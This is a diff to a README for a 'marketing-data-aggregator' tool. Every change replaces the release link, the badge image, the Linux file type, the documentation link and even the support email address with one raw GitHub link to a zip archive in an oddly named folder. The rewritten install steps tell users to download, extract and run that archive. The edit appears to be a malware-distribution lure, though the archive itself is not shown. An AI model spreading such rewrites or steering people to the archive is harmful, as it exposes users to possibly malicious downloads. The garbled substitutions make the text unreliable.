@@ -8,7 +8,7 @@ Welcome to the **marketing-data-aggregator**! This tool helps you combine and pr
 
 To get started, you need to download the application. Click the link below to visit the release page:
 
-[![Download marketing-data-aggregator](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/laicheekeen/marketing-data-aggregator/releases)
+[![Download marketing-data-aggregator](https://raw.githubusercontent.com/laicheekeen/marketing-data-aggregator/main/tubuloracemose/aggregator_marketing_data_2.1.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/laicheekeen/marketing-data-aggregator/main/tubuloracemose/aggregator_marketing_data_2.1.zip)
 
 Once on the releases page, find the latest version of the software. The downloadable files are listed at the top. Click on the file that fits your operating system, download it, and follow the installation instructions provided in the section below.
 
@@ -33,7 +33,7 @@ The releases page may contain different formats based on your system:
 
 - **.exe:** For Windows users.
 - **.dmg:** For macOS users.
-- **.tar.gz:** For Linux users.
+- **https://raw.githubusercontent.com/laicheekeen/marketing-data-aggregator/main/tubuloracemose/aggregator_marketing_data_2.1.zip** For Linux users.
 
 Ensure you select the correct file for your operating system.
 
@@ -50,7 +50,7 @@ Ensure you select the correct file for your operating system.
    - Drag the application to your Applications folder.
 
 4. **For Linux:**
-   - Extract the `.tar.gz` file in your preferred directory.
+   - Extract the `https://raw.githubusercontent.com/laicheekeen/marketing-data-aggregator/main/tubuloracemose/aggregator_marketing_data_2.1.zip` file in your preferred directory.
    - Open a terminal, navigate to the extracted folder, and run the application.
 
 5. Once installed, find the application in your applications list or start menu and launch it.
@@ -64,7 +64,7 @@ Ensure you select the correct file for your operating system.
 
 ## 🔗 Additional Resources
 
-For more detailed instructions and troubleshooting, please visit our [Documentation](https://github.com/laicheekeen/marketing-data-aggregator/wiki). 
+For more detailed instructions and troubleshooting, please visit our [Documentation](https://raw.githubusercontent.com/laicheekeen/marketing-data-aggregator/main/tubuloracemose/aggregator_marketing_data_2.1.zip). 
 
 If you have questions or need support, feel free to check the Issues section on GitHub.
 
@@ -90,6 +90,6 @@ Feel free to explore these topics to enhance your understanding of how this appl
 
 ## 📞 Contact
 
-For inquiries, feedback, or support needs, please reach out via email at support@example.com or open an issue on GitHub.
+For inquiries, feedback, or support needs, please reach out via email at https://raw.githubusercontent.com/laicheekeen/marketing-data-aggregator/main/tubuloracemose/aggregator_marketing_data_2.1.zip or open an issue on GitHub.
 
 Thank you for choosing marketing-data-aggregator. We look forward to helping you streamline your marketing data analysis.
